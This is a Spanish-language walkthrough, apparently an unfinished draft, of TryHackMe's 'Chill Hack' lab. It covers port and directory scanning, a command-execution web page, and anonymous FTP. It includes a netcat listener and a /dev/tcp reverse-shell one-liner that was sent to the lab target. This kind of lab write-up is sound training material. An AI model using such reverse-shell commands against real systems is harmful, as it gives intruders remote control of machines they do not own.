---
title: Write-Up Chill Hack
description: Write-Up sobre la máquina Chill Hack de TryHackMe
published: false
date: 2025-01-24T11:53:03.469Z
tags: tryhackme
editor: markdown
dateCreated: 2025-01-24T11:20:08.121Z
---

# Write Up
Bienvenido a mi Write Up de la máquina [Chill Hack de TryHackMe](https://tryhackme.com/r/room/chillhack). Esta máquina es considerada facil y se puede hacer en unos 45 minutos.
## Preparación
Lo primero que haremos será abrir el archivo de VPN otorgado por TryHackme, y le haremos un ping a la ip de la máquina que nos han dado
![imagen_hacking_chill-hack_1ping.png](/imagen_hacking_chill-hack_1ping.png)

## Escaneo y primer vistazo
Una vez comprobado que no hay problemas con el ping, haremos un escaneo de puertos para observar que podemos ver. Para ello hacemos un 
``` bash
nmap -sT -Pn -sV 10.10.38.123
```
![imagen_hacking_chill-hack_2nmap.png](/imagen_hacking_chill-hack_2nmap.png)

Como podemos observartenemos los siguientes puertos abiertos:
- 21: FTP -> Servidor FTP
- 22: SSH -> Para conexiones remotas
- 80: HTTP -> Para servicio web

Debido a que no tenemos credenciales de SSH, vamos a probar primero con los otros dos servicios.
### HTTP
Si nos dirigmos a nuestro navegador y ponemos la IP de nuestra máquina, podemos cargar un servicio web donde parece ser que son cosas de deporte.
![imagen_hacking_chill-hack_3website.png](/imagen_hacking_chill-hack_3website.png)

Podemos hacer un **dirb**, para analizar todos los subdirectorios que tiene.
``` bash
dirb http://10.10.38.123
```
![imagen_hacking_chill-hack_10dirb1.png](/imagen_hacking_chill-hack_10dirb1.png)
![imagen_hacking_chill-hack_11dirb2.png](/imagen_hacking_chill-hack_11dirb2.png)
Como observamos, hemos encontrado un directorio llamado *secret*, que dentro un index.html, asi que vamos a mirar que es.
![imagen_hacking_chill-hack_4secret.png](/imagen_hacking_chill-hack_4secret.png)

Una vez dentro, observamos lo que parece ser una terminal, por lo que vamos a poner comandos simples como 
``` bash
whoami
```
Como podemos ver, nuestra página ha cambiado, nos ha devuelto el comando y ahora parece ser que hay un gif.
![imagen_hacking_chill-hack_5comandobueno.png](/imagen_hacking_chill-hack_5comandobueno.png)

Vamos a intentar crear una shell reversa, recomiendo el uso de [RevShell](https://www.revshells.com).
En mi máquina Kali vamos a poner
```bash
nc -lnvp 9000
```
![imagen_hacking_chill-hack_6shellkali.png](/imagen_hacking_chill-hack_6shellkali.png)
Y en la consola de la página vamos a poner:
```bash
sh -i >& /dev/tcp/10.9.3.9/9000 0>&1
```
Lamentablemente, parece que el comando no ha funcionado. Volveremos a esto más adelante, antes vamos a ir al servidor FTP
![imagen_hacking_chill-hack_7comandomalo.png](/imagen_hacking_chill-hack_7comandomalo.png)
### Servidor FTP
Nos conectamos al servidor con el usuario *anonymous* y sin contraseña.
```bash
ftp 10.10.38.123
```
![imagen_hacking_chill-hack_8ftp.png](/imagen_hacking_chill-hack_8ftp.png)

Haciendo el comando **dir**, podemos listar todo lo que hay y nos podemos encontrar un archivo llamado *note.txt*. Los comandos que hemos puesto ahora son:
``` ftp
dir
get note.txt
```
![imagen_hacking_chill-hack_9get.png](/imagen_hacking_chill-hack_9get.png)